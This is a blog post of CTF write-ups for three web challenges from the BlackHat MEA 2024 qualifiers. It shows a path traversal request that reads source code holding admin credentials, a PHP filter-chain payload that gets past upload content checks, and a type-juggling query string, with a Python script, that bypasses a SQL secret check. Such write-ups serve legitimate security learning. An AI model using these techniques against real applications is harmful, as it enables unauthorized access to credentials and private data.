---
title: BlackHat MEA 2024 Qualifiers Write-Up
published: 2024-08-17
description: 'Our team qualified for BlackHat MEA 2024! This post includes web challenge write-ups from the qualifiers and insights into our journey to the top 100.'
image: './cover.jpg'
tags: [BlackHat, CTF, WebSecurity]
category: 'CTF'
draft: false
---
# BlackHat MEA 2024 Qualifiers – Web Challenge Write-Ups

We’re thrilled to share that our team made it into the **Top 100** for the **BlackHat MEA 2024 Qualifiers**! Here are detailed walkthroughs for three web challenges we solved: **Watermelon**, **Free Flag**, and **Notey**. Each one tested different aspects of web exploitation, from file traversal to unconventional SQL logic.

---

## Watermelon Write-Up

- **Category:** Web  
- **Points:** 120  
- **Difficulty:** Easy  

### Challenge Description

> All love for Watermelons 🍉🍉🍉  
> *Note: The code is not jailed — take care while crafting exploits.*

🔗 [Challenge Files](https://github.com/hanzalaghayasabbasi/BlackHat-MEA-2024-Qualifiers-Write-Ups/tree/main/Watermelon-src)


###  Walkthrough

#### 1. Registration & Login

We registered a user via `/register` and grabbed the session cookie after login.

![Register](https://github.com/user-attachments/assets/6b80c459-419c-41dc-8287-c62f437c7a09)  
![Login Cookie](https://github.com/user-attachments/assets/a6802a2d-b197-482a-b340-8e8b508fb2cd)



#### 2. File Traversal → Admin Password

We discovered that `app/app.py` contained admin credentials and identified a file traversal vulnerability in the `/upload` path.

![Traversal Found](https://github.com/user-attachments/assets/bde3eb53-e89b-4c97-b309-376d940057fd)

Using `curl`, we accessed `/file/1/../../../app/app.py` and extracted the password:

![Admin Password](https://github.com/user-attachments/assets/23a06e81-05ee-45b8-ad8f-8b3978fc7528)



#### 3. Admin Login & Cookie Hijack

We logged in with the credentials and copied the session:

![Admin Session](https://github.com/user-attachments/assets/b354a35e-c8ad-4a1a-8d49-dacc891046b0)



#### 4. Flag Retrieval

A simple GET to `/admin` with the admin cookie gave us the flag:

![Flag](https://github.com/user-attachments/assets/4acf6005-ce59-4df5-b710-f2e95fa551d9)

---

## Free Flag Write-Up

- **Category:** Web  
- **Points:** 110  
- **Difficulty:** Easy  

### Challenge Description

> Free Free

🔗 [Challenge Files](https://github.com/hanzalaghayasabbasi/BlackHat-MEA-2024-Qualifiers-Write-Ups/tree/main/FreeFlag-src)

---

### Exploit Strategy

The application checked for specific content in uploaded files. We used the [`wrapwarp`](https://github.com/AabyssZG/wrapwarp) tool to generate a filtered payload:

```bash
python3 wrapwarp.py /flag.txt "<?php" "?>" 100
```

This created a long filter chain, bypassing content restrictions:

```
php://filter/convert.base64-encode|convert.iconv.855.UTF7|...
```


### 🏁 Retrieving the Flag

Posting the payload allowed us to bypass file inspection and retrieve the flag from inside a PHP wrapper.

![Flag Output](https://github.com/user-attachments/assets/68a070bf-cf4d-46e7-825c-ed04690981e8)

---

## Notey Write-Up

- **Category:** Web  
- **Points:** 180  
- **Difficulty:** Medium  

### Challenge Description

> I created a note-sharing site. Don’t try to access other people’s notes — grass isn’t greener :'(

🔗 [Challenge Files](https://github.com/hanzalaghayasabbasi/BlackHat-MEA-2024-Qualifiers-Write-Ups/tree/main/Notey-src)



### Vulnerability: Type Juggling → Logic Flaw

The app lets users view notes using an ID and secret. But the `viewNote` endpoint didn’t validate input types, allowing arrays to be passed.

Sending:

```
/viewNote?note_id=66&note_secret[username]=admin
```

Resulted in this SQL query:

```sql
SELECT note_id, username, note FROM notes 
WHERE note_id = '66' AND secret = `username` = 'admin'
```

Which simplifies to:

```sql
... WHERE note_id = '66' AND 1
```

The condition evaluates true because the `username='admin'` exists.



### Alternative Bypass

If `username` isn't available, we could still bypass with:

```
/viewNote?note_id=66&note_secret[note]=test
```



### Exploit Script

The session expired quickly (under 3 seconds), so we automated the entire flow:

```python
import requests

base_url = 'http://a7c623f98ed8647acdccc.playat.flagyard.com'
username = "hanzala"
password = "11223344"

sess = requests.Session()
sess.post(f"{base_url}/register", data={"username": username, "password": password})
sess.post(f"{base_url}/login", data={"username": username, "password": password})

target_url = f"{base_url}/viewNote?note_id=66&note_secret[username]=admin"
exp = sess.get(target_url)
print(f"Flag: {exp.json()[0]['note']}")
```

---

##  Final Thoughts

These challenges blended practical web attack techniques with creative logic flaws. It was a rewarding experience to solve them under pressure — and making it into the Top 100 feels even better. Huge shoutout to the organizers and good luck to everyone in the next stage! 💪🏽


Happy Hacking, 
